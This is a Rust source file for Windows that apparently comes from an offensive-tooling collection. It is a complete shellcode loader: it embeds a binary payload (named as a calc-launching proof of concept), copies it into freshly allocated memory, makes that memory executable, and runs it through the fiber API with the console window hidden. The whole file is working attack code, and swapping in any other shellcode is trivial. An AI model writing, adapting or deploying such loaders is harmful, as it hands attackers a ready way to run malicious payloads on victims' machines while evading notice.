#![windows_subsystem = "windows"]

use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::FALSE;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
static SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;
    unsafe {
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber == null_mut() {
            eprintln!("ConvertThreadToFiber failed!");
            return;
        }

        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if dest == null_mut() {
            eprintln!("VirtualAlloc failed!");
            return;
        }

        copy(SHELLCODE.as_ptr(), dest as *mut u8, SIZE);
        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            eprintln!("VirtualProtect failed!");
            return;
        }

        let dest = transmute(dest);
        let fiber = CreateFiber(0, dest, null());
        if fiber == null_mut() {
            eprintln!("CreateFiber failed!");
            return;
        }

        SwitchToFiber(fiber);
        SwitchToFiber(main_fiber);
    }
}
